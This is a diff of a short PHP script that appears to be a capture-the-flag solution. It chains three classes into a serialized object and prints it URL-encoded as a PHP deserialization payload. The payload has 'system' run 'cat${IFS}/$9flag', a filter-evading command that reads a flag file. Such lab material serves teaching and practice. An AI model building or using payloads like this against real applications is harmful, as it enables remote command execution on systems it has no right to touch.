@@ -83,39 +83,66 @@
 
 <?php
 
+
 class syc
+
+
 {
+
     public $cuit;
+
 
 }
 
+
 class lover
+
+
 {
+
+
     public $yxx;
+
+
     public $QW;
 
 
 }
 
+
 class web
+
+
 {
+
+
     public $eva1="system";
+
+
     public $interesting="cat\${IFS}/$9flag";
 
 
 }
 
 $a=new syc;
+
+
 $b=new lover;
+
+
 $c=new web;
 
 
 $a->cuit=$b;
+
+
 $b->yxx=$c;
+
 
 echo urlencode(serialize($a));
 
 
 ?>
+
 
 <br>
